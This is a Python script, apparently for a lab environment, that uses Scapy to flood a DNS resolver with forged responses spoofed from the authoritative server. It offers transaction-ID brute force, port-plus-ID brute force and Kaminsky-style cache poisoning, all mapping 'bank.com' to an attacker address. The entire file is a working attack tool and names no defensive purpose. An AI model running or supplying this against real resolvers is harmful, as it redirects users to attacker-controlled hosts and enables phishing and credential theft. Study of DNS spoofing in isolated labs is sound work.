import os
import time
from typing import Iterable, List

from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send  # type: ignore

RESOLVER_IP = os.getenv("RESOLVER_IP", "10.50.0.53")
AUTH_IP = os.getenv("AUTH_IP", "10.50.0.100")
RESOLVER_UPSTREAM_PORT = int(os.getenv("RESOLVER_UPSTREAM_PORT", "33333"))
PORT_BRUTE_BASE = int(os.getenv("PORT_BRUTE_BASE", "33300"))
PORT_BRUTE_SPACE = int(os.getenv("PORT_BRUTE_SPACE", "20"))
PORT_TXID_SPACE = int(os.getenv("PORT_TXID_SPACE", "10"))
TXID_SPACE = int(os.getenv("TXID_SPACE", "200"))
RESPONSE_BUDGET = int(os.getenv("RESPONSE_BUDGET", "200"))
ATTACK_RATE = float(os.getenv("ATTACK_RATE", "0.25"))
ATTACK_VARIANT = os.getenv("ATTACK_VARIANT", "txid").strip().lower()
POISON_IP = os.getenv("POISON_IP", "6.6.6.6")

BANK_QNAME = "bank.com."
KAMINSKY_QNAME = "victim.bank.com."
LEGIT_TRIGGER_IP = "198.51.100.10"
BATCH_SIZE = int(os.getenv("BATCH_SIZE", str(RESPONSE_BUDGET)))


def packet(txid: int, dport: int, qname: str, include_bank_poison: bool):
    dns = DNS(
        id=txid,
        qr=1,
        aa=1,
        rd=1,
        qd=DNSQR(qname=qname, qtype="A"),
        an=DNSRR(rrname=qname, type="A", ttl=60, rdata=POISON_IP if qname == BANK_QNAME else LEGIT_TRIGGER_IP),
        ancount=1,
    )
    if include_bank_poison:
        dns.ar = DNSRR(rrname=BANK_QNAME, type="A", ttl=300, rdata=POISON_IP)
        dns.arcount = 1

    return IP(src=AUTH_IP, dst=RESOLVER_IP) / UDP(sport=53, dport=dport) / dns


def chunks(items: Iterable, size: int) -> Iterable[List]:
    batch = []
    for item in items:
        batch.append(item)
        if len(batch) >= size:
            yield batch
            batch = []
    if batch:
        yield batch


def build_txid_packets():
    for txid in range(min(TXID_SPACE, RESPONSE_BUDGET)):
        yield packet(txid, RESOLVER_UPSTREAM_PORT, BANK_QNAME, False)


def build_port_packets():
    sent = 0
    for dport in range(PORT_BRUTE_BASE, PORT_BRUTE_BASE + PORT_BRUTE_SPACE):
        for txid in range(PORT_TXID_SPACE):
            if sent >= RESPONSE_BUDGET:
                return
            sent += 1
            yield packet(txid, dport, BANK_QNAME, False)


def build_kaminsky_packets():
    for txid in range(min(TXID_SPACE, RESPONSE_BUDGET)):
        yield packet(txid, RESOLVER_UPSTREAM_PORT, KAMINSKY_QNAME, True)


def main():
    builders = {
        "txid": build_txid_packets,
        "port": build_port_packets,
        "kaminsky": build_kaminsky_packets,
    }
    build = builders.get(ATTACK_VARIANT, build_txid_packets)

    print(
        f"[*] Flooding S-type spoofed DNS responses: "
        f"variant={ATTACK_VARIANT}, response_budget={RESPONSE_BUDGET}, "
        f"TXID_SPACE={TXID_SPACE}, PORT_SPACE={PORT_BRUTE_SPACE}, PORT_TXID_SPACE={PORT_TXID_SPACE}"
    )

    while True:
        for batch in chunks(build(), BATCH_SIZE):
            send(batch, verbose=0)
        time.sleep(ATTACK_RATE)


if __name__ == "__main__":
    main()
